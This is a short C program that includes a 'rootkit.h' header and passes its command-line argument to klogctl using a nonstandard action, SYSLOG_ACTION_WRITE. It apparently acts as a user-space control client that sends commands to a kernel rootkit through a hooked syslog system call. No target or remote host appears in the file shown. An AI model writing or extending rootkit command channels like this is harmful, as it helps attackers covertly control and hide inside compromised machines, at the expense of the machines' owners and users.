#include <sys/klog.h> 
#include <stdio.h>
#include <string.h>
#include "rootkit.h"

int main(int argc, char *argv[]) {

    if (argc != 2) {
        fprintf(stderr, "Wrong number of arguments!\n");
        return -1;
    }

    klogctl(SYSLOG_ACTION_WRITE, argv[1], strlen(argv[1]));

    return 0;
}
